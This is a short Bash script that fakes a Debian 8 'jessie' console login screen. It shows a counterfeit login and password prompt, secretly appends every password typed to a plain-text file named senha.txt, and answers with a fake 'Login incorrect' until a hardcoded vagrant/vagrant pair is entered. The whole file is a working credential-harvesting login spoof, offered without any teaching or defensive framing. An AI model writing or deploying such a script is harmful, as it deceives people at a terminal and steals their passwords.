#!/bin/bash
SAI=1
USUARIO=vagrant
SENHA=vagrant
QNT=1
while (($SAI != 0)); do 	
clear
echo 
echo "Debian GNU/Linux 8 jessie tty1"
echo
 while (($QNT <= 5)); do
 echo -n  "jessie login: "
 read USER 
 echo -n "password: "
 read -s PASS
 echo
 echo
 echo $PASS >> senha.txt
 if [ $USER == $USUARIO ]; then
	if [ $PASS == $SENHA ]; then
		SAI=0
		QNT=6
	else
		echo
		echo "Login incorrect"
		sleep 3
	fi
else
	echo 
	sleep 3
	echo "Login incorrect"
fi
	 let QNT=($QNT+1)
	done
	QNT=1
done
echo "Passou!"
sleep 3
clear
